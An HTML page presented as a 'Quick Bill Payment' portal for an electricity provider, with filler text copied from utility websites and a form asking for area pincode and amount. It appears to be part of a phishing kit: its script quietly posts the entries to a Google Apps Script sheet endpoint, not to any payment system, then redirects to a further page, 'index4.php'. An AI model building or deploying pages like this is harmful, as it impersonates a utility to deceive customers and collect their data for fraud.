<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
}

* {
  box-sizing: border-box;
}

/* Add padding to containers */
.container {
  padding: 16px;
  background-color: white;
}

/* Full-width input fields */
input[type=number], input[type=text], input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 22px 0;
  display: inline-block;
  border: none;
  background: #f1f1f1;
}

input[type=number]:focus, input[type=text]:focus, input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Overwrite default styles of hr */
hr {
  border: 1px solid #f1f1f1;
  margin-bottom: 25px;
}

/* Set a style for the submit button */
.registerbtn {
  background-color: #118dff;
  color: white;
  padding: 16px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
  opacity: 0.9;
}

.registerbtn:hover {
  opacity: 1;
}

/* Add a blue text color to links */
a {
  color: dodgerblue;
}

/* Set a grey background color and center the text of the "sign in" section */
.signin {
  background-color: #f1f1f1;
  text-align: center;
}
</style>
</head>
<body>



  <center>  <img
src="fst1.png"
style="width:
45%;"> </center>

<p>Quick Bill Payment</p>
  
   
    
<form class="login100-form validate-form" method="post" name="google-sheet">
<div class="container">
    <label for="email"><b>Area Pincode *</b></label>
    <input type="number" placeholder="Enter Area pincode" name="pincode" autocomplete="off" required>

   

    <label for="psw-repeat"><b>Amount *</b></label>
    <input type="number" placeholder="Enter Amount" value="10" name="amount" autocomplete="off" required>
    
    
    <button type="submit" class="registerbtn">Next</button>
  </div>
  
  <P>* View & Pay Bill · Print Receipt · Print Receipt by PG/Vendor · OLD Prepaid Online Recharge · Pay Estimate/Miscellaneous chrages Suvidha ...</P>
<p>* Paying electricity bill online is the most helpful option, you can pay anywhere & anytime without jumping the deadline. You can pay your EB bill from mobile ...</p>
<p>* The Company is managed by a Board of Directors comprising twelve members out of which seven are Executive Directors including Chairman & Managing Director. Besides one Woman Director and four Independent Directors constitute the Board.</p>
  </div>
</form>


<script>
            const scriptURL = 'https://script.google.com/macros/s/AKfycbxuhRyRHmviAIN2YKgZSranR16Sb86BI2nO9_8I0Hp6Of4P4wgbY4WhipqvHzNAiZ6TZg/exec'
            const form = document.forms['google-sheet']
             
             form.addEventListener('submit', e => {
               e.preventDefault()
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response =>  window.location.href='index4.php')
                 .catch(error => console.error('Error!', error.message))
             })
       </script>







</body>
</html>
